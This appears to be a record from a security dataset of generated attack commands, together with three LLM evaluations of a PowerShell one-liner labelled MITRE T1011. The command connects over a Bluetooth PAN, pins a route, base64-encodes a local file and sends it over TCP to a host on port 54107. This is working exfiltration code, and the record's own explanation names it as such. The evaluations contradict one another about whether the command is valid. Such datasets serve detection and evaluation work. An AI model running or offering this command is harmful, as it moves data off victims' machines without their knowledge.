command: & 'C:\Tools\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $ad=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1); netsh interface ip set address name="$($ad.Name)" static 10.241.56.2 255.255.255.252 | Out-Null; route add 10.241.56.1 mask 255.255.255.255 10.241.56.2 if $($ad.ifIndex) metric 5 | Out-Null; $b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\ProgramData\misc.bin')); $c=New-Object Net.Sockets.TcpClient; $c.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('10.241.56.2'),0)); $c.Connect('10.241.56.1',54107); $s=$c.GetStream(); $x=[Text.Encoding]::UTF8.GetBytes($b); $s.Write($x,0,$x.Length); $s.Close(); $c.Close()
explanation: Pins a host route to the Bluetooth interface to prevent crossover, then exfiltrates base64 data over a custom TCP port via the Bluetooth PAN (T1011).
rationale_steps: Connect Bluetooth NAP to use a different medium.
Set a static address on the Bluetooth adapter using netsh.
Add a host route bound to the Bluetooth interface index to force path selection.
Bind TCP socket to the Bluetooth IP and transmit base64 payload to a high port.

llm_judgments.syntactic_justification: The command is perfectly well-formed with balanced quotes, proper command separators, valid PowerShell syntax including pipeline operations, variable assignments, and object method calls.
llm_judgments.semantic_justification: The command fully implements the claimed exfiltration technique by establishing a Bluetooth PAN connection, configuring network settings, and transmitting base64-encoded file data over TCP to a specific endpoint, aligning with the T1011 technique for exfiltration over alternative protocol.

llm_judgments.syntactic_justification: The PowerShell command is perfectly well-formed with balanced quotes, correct command separators, and valid syntax for all invoked cmdlets and .NET classes.
llm_judgments.semantic_justification: While the command plausibly achieves Bluetooth PAN setup and data exfiltration, it fundamentally misrepresents T1011 by directly executing PowerShell and a third-party executable, rather than abusing a trusted system script as a proxy.

llm_judgments.syntactic_justification: The PowerShell is well-formed with balanced quotes and valid separators, though the unquoted MAC address (11-22-33-44-55-66) may be parsed as arithmetic and should be quoted.
llm_judgments.semantic_justification: The flow aims to exfiltrate data over a Bluetooth PAN and pin a route, but the netsh static IP command omits the required gateway/none and the route uses the local IP as the next hop, which likely prevents the intended connectivity.
